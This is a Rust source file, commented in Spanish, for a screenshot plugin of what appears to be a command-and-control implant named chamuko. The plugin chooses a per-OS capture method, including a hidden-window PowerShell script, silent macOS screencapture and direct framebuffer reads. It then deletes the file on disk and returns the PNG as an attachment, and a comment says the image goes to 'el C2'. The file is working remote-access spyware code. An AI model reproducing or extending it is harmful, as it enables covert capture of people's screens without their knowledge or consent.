//! Captura de pantalla multiplataforma.
//!
//! El plugin decide *como* capturar sin tocar el sistema: devuelve un plan
//! (programa + argumentos + destino). Asi se puede testear en CI sin servidor
//! grafico, y solo al ejecutar se lanza algo de verdad.

use std::path::{Path, PathBuf};
use std::time::Duration;

use chamuko_plugin_api::{
    Attachment, CommandContext, CommandOutput, LifecycleEvent, Plugin, PluginError, PluginMetadata,
    PluginResult,
};

/// Backend elegido. Se guarda para poder explicar el resultado y para testear
/// la seleccion sin lanzar nada.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Backend {
    /// Windows: PowerShell con System.Drawing.
    PowerShell,
    /// macOS: `screencapture`, incluido en el sistema desde 10.2.
    Screencapture,
    /// Wayland: `grim`.
    Grim,
    /// X11: `scrot`.
    Scrot,
    /// X11 via ImageMagick.
    ImageMagick,
    /// Linux sin servidor grafico: lee el framebuffer.
    Framebuffer,
}

impl Backend {
    pub fn name(self) -> &'static str {
        match self {
            Self::PowerShell => "powershell",
            Self::Screencapture => "screencapture",
            Self::Grim => "grim",
            Self::Scrot => "scrot",
            Self::ImageMagick => "import",
            Self::Framebuffer => "framebuffer",
        }
    }
}

/// Un plan de captura: que ejecutar y que fichero esperar.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CapturePlan {
    pub backend: Backend,
    pub program: String,
    pub args: Vec<String>,
    /// Ruta donde el programa deja el PNG.
    pub output: PathBuf,
}

/// Selecciona el backend segun plataforma y herramientas disponibles.
///
/// `available` se inyecta para que los tests no dependan de la maquina.
pub fn plan_capture(
    platform: &str,
    output: PathBuf,
    available: &dyn Fn(&str) -> bool,
) -> Option<CapturePlan> {
    match platform {
        "windows" => Some(CapturePlan {
            backend: Backend::PowerShell,
            program: "powershell".to_string(),
            args: powershell_args(&output),
            output,
        }),
        "macos" => Some(CapturePlan {
            backend: Backend::Screencapture,
            program: "screencapture".to_string(),
            args: vec!["-x".to_string(), output.display().to_string()],
            output,
        }),
        _ => {
            // Preferencia en Linux: Wayland nativo, luego X11, y por ultimo el
            // framebuffer, que no necesita servidor grafico.
            if available("grim") {
                return Some(CapturePlan {
                    backend: Backend::Grim,
                    program: "grim".to_string(),
                    args: vec![output.display().to_string()],
                    output,
                });
            }
            if available("scrot") {
                return Some(CapturePlan {
                    backend: Backend::Scrot,
                    program: "scrot".to_string(),
                    args: vec!["-o".to_string(), output.display().to_string()],
                    output,
                });
            }
            if available("import") {
                return Some(CapturePlan {
                    backend: Backend::ImageMagick,
                    program: "import".to_string(),
                    args: vec![
                        "-window".to_string(),
                        "root".to_string(),
                        output.display().to_string(),
                    ],
                    output,
                });
            }
            if available("/dev/fb0") || available("/dev/framebuffer/0") {
                return Some(CapturePlan {
                    backend: Backend::Framebuffer,
                    program: String::new(),
                    args: Vec::new(),
                    output,
                });
            }
            None
        }
    }
}

fn powershell_args(output: &Path) -> Vec<String> {
    // La ruta va con comillas dobladas dentro del script: si el operador la
    // elige con espacios o comillas, PowerShell no debe romper el literal.
    let escaped = output.display().to_string().replace('\'', "''");
    let script = format!(
        "Add-Type -AssemblyName System.Windows.Forms; \
         Add-Type -AssemblyName System.Drawing; \
         $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \
         $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height; \
         $g = [System.Drawing.Graphics]::FromImage($bmp); \
         $g.CopyFromScreen($b.X, $b.Y, 0, 0, $b.Size); \
         $bmp.Save('{escaped}', [System.Drawing.Imaging.ImageFormat]::Png); \
         $g.Dispose(); $bmp.Dispose();"
    );
    vec![
        "-NoProfile".to_string(),
        "-NonInteractive".to_string(),
        "-WindowStyle".to_string(),
        "Hidden".to_string(),
        "-Command".to_string(),
        script,
    ]
}

/// Nombre del fichero de captura, con marca de tiempo para no pisar otro.
pub fn capture_filename(stamp: u64) -> String {
    format!("screenshot-{stamp}.png")
}

/// Comprueba que los bytes son un PNG de verdad.
///
/// Algunos backends dejan un fichero vacio o con un mensaje de error; sin esta
/// comprobacion el C2 recibiria basura con extension .png.
pub fn is_png(data: &[u8]) -> bool {
    data.len() >= 8 && data[..8] == [0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A]
}

/// Geometria de un framebuffer Linux.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct FramebufferGeometry {
    pub width: u32,
    pub height: u32,
    /// Bits por pixel. 32 es lo habitual (BGRA).
    pub bits_per_pixel: u32,
}

impl FramebufferGeometry {
    pub fn stride(&self) -> usize {
        (self.width as usize * self.bits_per_pixel as usize) / 8
    }

    pub fn expected_len(&self) -> usize {
        self.stride() * self.height as usize
    }

    /// Valida que la geometria tenga sentido antes de reservar memoria por ella.
    pub fn is_sane(&self) -> bool {
        self.width > 0
            && self.height > 0
            && matches!(self.bits_per_pixel, 16 | 24 | 32)
            && self.width <= 16_384
            && self.height <= 16_384
            && self.expected_len() <= chamuko_plugin_api::MAX_ATTACHMENT_BYTES
    }
}

/// Lee la geometria que el kernel publica en /sys.
pub fn read_framebuffer_geometry(sysfs_root: &Path) -> Option<FramebufferGeometry> {
    let size = std::fs::read_to_string(sysfs_root.join("virtual_size")).ok()?;
    let (w, h) = size.trim().split_once(',')?;
    let bpp = std::fs::read_to_string(sysfs_root.join("bits_per_pixel")).ok()?;
    let geometry = FramebufferGeometry {
        width: w.trim().parse().ok()?,
        height: h.trim().parse().ok()?,
        bits_per_pixel: bpp.trim().parse().ok()?,
    };
    geometry.is_sane().then_some(geometry)
}

/// Convierte pixeles BGRA/RGBA a RGB de 8 bits.
pub fn bgra_to_rgb(pixels: &[u8], bpp: u32) -> Vec<u8> {
    let step = (bpp as usize / 8).max(1);
    let mut out = Vec::with_capacity(pixels.len() / step * 3);
    for pixel in pixels.chunks_exact(step) {
        match step {
            4 | 3 => out.extend_from_slice(&[pixel[2], pixel[1], pixel[0]]),
            _ => {
                // 16 bpp: RGB565. Se expande a 8 bits por canal.
                let value = u16::from_le_bytes([pixel[0], pixel.get(1).copied().unwrap_or(0)]);
                let r = ((value >> 11) & 0x1F) as u8;
                let g = ((value >> 5) & 0x3F) as u8;
                let b = (value & 0x1F) as u8;
                out.extend_from_slice(&[r << 3, g << 2, b << 3]);
            }
        }
    }
    out
}

/// Empaqueta RGB en un PNG sin compresion (deflate "stored").
///
/// Evita meter la crate `image` en el agente: un PNG valido es cabecera, IHDR,
/// IDAT con bloques stored y IEND. El CRC32 y el Adler32 se calculan aqui.
pub fn encode_png(width: u32, height: u32, rgb: &[u8]) -> Result<Vec<u8>, String> {
    if width == 0 || height == 0 {
        return Err("png: zero dimension".to_string());
    }
    let expected = width as usize * height as usize * 3;
    if rgb.len() != expected {
        return Err(format!(
            "png: expected {expected} RGB bytes, got {}",
            rgb.len()
        ));
    }

    // Cada scanline lleva delante un byte de filtro (0 = None).
    let mut raw = Vec::with_capacity(expected + height as usize);
    for row in rgb.chunks_exact(width as usize * 3) {
        raw.push(0);
        raw.extend_from_slice(row);
    }

    let mut png = Vec::with_capacity(raw.len() + 1024);
    png.extend_from_slice(&[0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A]);

    let mut ihdr = Vec::with_capacity(13);
    ihdr.extend_from_slice(&width.to_be_bytes());
    ihdr.extend_from_slice(&height.to_be_bytes());
    ihdr.extend_from_slice(&[8, 2, 0, 0, 0]); // 8 bits, RGB, sin interlace
    write_chunk(&mut png, b"IHDR", &ihdr);

    write_chunk(&mut png, b"IDAT", &zlib_stored(&raw));
    write_chunk(&mut png, b"IEND", &[]);
    Ok(png)
}

fn write_chunk(out: &mut Vec<u8>, kind: &[u8; 4], data: &[u8]) {
    out.extend_from_slice(&(data.len() as u32).to_be_bytes());
    out.extend_from_slice(kind);
    out.extend_from_slice(data);
    let mut crc_input = Vec::with_capacity(4 + data.len());
    crc_input.extend_from_slice(kind);
    crc_input.extend_from_slice(data);
    out.extend_from_slice(&crc32(&crc_input).to_be_bytes());
}

/// Envuelve datos en zlib usando bloques "stored" (sin compresion).
fn zlib_stored(data: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(data.len() + 16);
    out.extend_from_slice(&[0x78, 0x01]); // zlib, sin diccionario

    if data.is_empty() {
        out.extend_from_slice(&[0x01, 0x00, 0x00, 0xFF, 0xFF]);
    } else {
        let chunks: Vec<&[u8]> = data.chunks(65_535).collect();
        for (index, block) in chunks.iter().enumerate() {
            let last = index + 1 == chunks.len();
            out.push(u8::from(last));
            let len = block.len() as u16;
            out.extend_from_slice(&len.to_le_bytes());
            out.extend_from_slice(&(!len).to_le_bytes());
            out.extend_from_slice(block);
        }
    }

    out.extend_from_slice(&adler32(data).to_be_bytes());
    out
}

fn crc32(data: &[u8]) -> u32 {
    let mut crc = 0xFFFF_FFFFu32;
    for byte in data {
        crc ^= *byte as u32;
        for _ in 0..8 {
            let mask = (crc & 1).wrapping_neg();
            crc = (crc >> 1) ^ (0xEDB8_8320 & mask);
        }
    }
    !crc
}

fn adler32(data: &[u8]) -> u32 {
    let mut a = 1u32;
    let mut b = 0u32;
    for byte in data {
        a = (a + *byte as u32) % 65521;
        b = (b + a) % 65521;
    }
    (b << 16) | a
}

pub struct ScreenshotPlugin;

impl Default for ScreenshotPlugin {
    fn default() -> Self {
        Self::new()
    }
}

impl ScreenshotPlugin {
    pub fn new() -> Self {
        Self
    }
}

impl Plugin for ScreenshotPlugin {
    fn metadata(&self) -> PluginMetadata {
        PluginMetadata {
            id: "screenshot",
            version: "0.1.0",
        }
    }

    fn on_event(&mut self, _event: LifecycleEvent) -> PluginResult {
        Ok(())
    }

    fn command_names(&self) -> Vec<&'static str> {
        vec!["screenshot"]
    }

    fn execute(&mut self, ctx: &mut CommandContext) -> Result<CommandOutput, PluginError> {
        let output = ctx.resolve(&capture_filename(chamuko_protocol::now_secs()));
        let Some(plan) = plan_capture(ctx.platform, output, &which_exists) else {
            return Ok(CommandOutput::failure(
                "screenshot: no capture backend (tried grim, scrot, import, framebuffer)",
            ));
        };

        // Una captura vieja en la misma ruta se leeria como si fuese nueva.
        let _ = std::fs::remove_file(&plan.output);

        match plan.backend {
            Backend::Framebuffer => capture_framebuffer(&plan.output),
            _ => run_backend(&plan),
        }
    }

    fn help_lines(&self) -> Vec<(&'static str, &'static str)> {
        vec![("screenshot", "capture the screen and send it as a PNG")]
    }
}

fn which_exists(program: &str) -> bool {
    if program.starts_with('/') {
        return Path::new(program).exists();
    }
    let Some(paths) = std::env::var_os("PATH") else {
        return false;
    };
    std::env::split_paths(&paths).any(|dir| dir.join(program).is_file())
}

fn run_backend(plan: &CapturePlan) -> Result<CommandOutput, PluginError> {
    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
    let outcome = chamuko_core::process::run_with_timeout(
        &plan.program,
        &plan.args,
        &cwd,
        Duration::from_secs(20),
        chamuko_plugin_api::MAX_OUTPUT_BYTES,
    )
    .map_err(|e| format!("screenshot: {e}"))?;

    if outcome.timed_out {
        return Ok(CommandOutput::failure("screenshot: backend timed out after 20s"));
    }

    let data = match std::fs::read(&plan.output) {
        Ok(d) => d,
        Err(e) => {
            return Ok(CommandOutput::failure(format!(
                "screenshot: {} left no file: {e} (exit {})",
                plan.backend.name(),
                outcome.exit_code
            )))
        }
    };
    if !is_png(&data) {
        return Ok(CommandOutput::failure(format!(
            "screenshot: {} wrote {} bytes that are not a PNG",
            plan.backend.name(),
            data.len()
        )));
    }

    let _ = std::fs::remove_file(&plan.output);
    Ok(attach(plan.backend, data))
}

fn attach(backend: Backend, data: Vec<u8>) -> CommandOutput {
    let name = capture_filename(chamuko_protocol::now_secs());
    let size = data.len();
    match Attachment::new(name, data) {
        Ok(attachment) => CommandOutput::new(format!(
            "captured {size} bytes via {}",
            backend.name()
        ))
        .with_attachment(attachment),
        Err(e) => CommandOutput::failure(format!("screenshot: {e}")),
    }
}

/// Lee /dev/fb0 y lo convierte a PNG. Es el unico camino sin herramientas.
fn capture_framebuffer(output: &Path) -> Result<CommandOutput, PluginError> {
    for (device, sysfs) in [
        ("/dev/fb0", "/sys/class/graphics/fb0"),
        ("/dev/framebuffer/0", "/sys/class/graphics/fb0"),
    ] {
        if !Path::new(device).exists() {
            continue;
        }
        let Some(geometry) = read_framebuffer_geometry(Path::new(sysfs)) else {
            return Ok(CommandOutput::failure(format!(
                "screenshot: {device} has no usable geometry in {sysfs}"
            )));
        };
        let pixels = match std::fs::read(device) {
            Ok(p) => p,
            Err(e) => {
                return Ok(CommandOutput::failure(format!(
                    "screenshot: cannot read {device}: {e}"
                )))
            }
        };
        let needed = geometry.expected_len();
        if pixels.len() < needed {
            return Ok(CommandOutput::failure(format!(
                "screenshot: {device} gave {} bytes, geometry needs {needed}",
                pixels.len()
            )));
        }
        let rgb = bgra_to_rgb(&pixels[..needed], geometry.bits_per_pixel);
        let png = match encode_png(geometry.width, geometry.height, &rgb) {
            Ok(p) => p,
            Err(e) => return Ok(CommandOutput::failure(format!("screenshot: {e}"))),
        };
        let _ = std::fs::remove_file(output);
        return Ok(attach(Backend::Framebuffer, png));
    }
    Ok(CommandOutput::failure("screenshot: no readable framebuffer"))
}

#[cfg(test)]
mod tests;
